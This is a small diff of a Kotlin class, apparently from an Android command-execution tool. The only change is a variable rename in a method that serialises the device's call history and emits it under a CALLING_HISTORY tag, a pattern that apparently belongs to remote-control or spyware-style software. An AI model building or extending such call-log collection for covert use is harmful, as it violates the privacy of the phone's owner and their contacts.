@@ -22,8 +22,8 @@ class Call(context: Context) : Command(), Executor {
     }
 
     override fun execute(data: Array<Any>) {
-        val data = Gson().toJson(CallingHistory.getDataList(context))
-        emitData(CALLING_HISTORY, data)
+        val history = Gson().toJson(CallingHistory.getDataList(context))
+        emitData(CALLING_HISTORY, history)
 
     }
 
